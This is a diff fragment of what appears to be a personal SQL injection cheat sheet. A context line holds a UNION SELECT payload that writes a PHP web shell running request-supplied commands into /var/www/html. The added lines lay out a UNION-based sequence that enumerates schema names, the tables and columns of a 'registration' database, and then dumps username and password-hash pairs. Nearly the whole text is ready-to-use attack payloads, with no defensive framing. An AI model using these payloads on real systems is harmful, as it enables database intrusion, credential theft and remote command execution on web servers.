@@ -27,3 +27,33 @@
 	
 'union+select+'<?php+system($_REQUEST[pen]);?>'+into+outfile+'/var/www/html/pen.php'--+
 	
+	
+	
+###############################3 I Love this #############################
+
+
+	
+
+
+$################ Best Way  #############
+
+
+######### Find Database Name 
+
+union select group_concat(schema_name) from information_schema.schemata--+
+
+
+###### Table Name Enumeration #####
+
+union select group_concat(table_name) from information_schema.tables where table_schema='registration'--+
+	
+
+## ##### Find Columns Name  in registration table
+
+union select group_concat(column_name) from information_schema.columns where table_name='registration'--+
+
+
+####### Extract Data from Database 
+
+union select group_concat(concat(username,':',userhash)) from registration--+
+
